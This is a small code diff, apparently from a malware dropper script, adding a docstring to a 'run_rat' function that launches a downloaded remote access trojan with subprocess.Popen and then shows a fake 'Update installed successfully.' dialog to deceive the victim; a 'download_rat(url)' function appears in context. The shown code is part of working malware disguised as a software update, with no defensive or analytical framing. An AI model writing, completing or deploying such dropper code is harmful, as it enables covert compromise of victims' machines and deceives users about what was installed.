@@ -36,6 +36,11 @@ def download_rat(url):
 
 
 def run_rat(filepath):
+    """
+    Executes the downloaded RAT and displays a fake success message to the user.
+
+    :param filepath: The full path to the RAT executable.
+    """
     try:
         subprocess.Popen(filepath, shell=True)
         ctypes.windll.user32.MessageBoxW(0, "Update installed successfully.", "Software Update", 0x40)
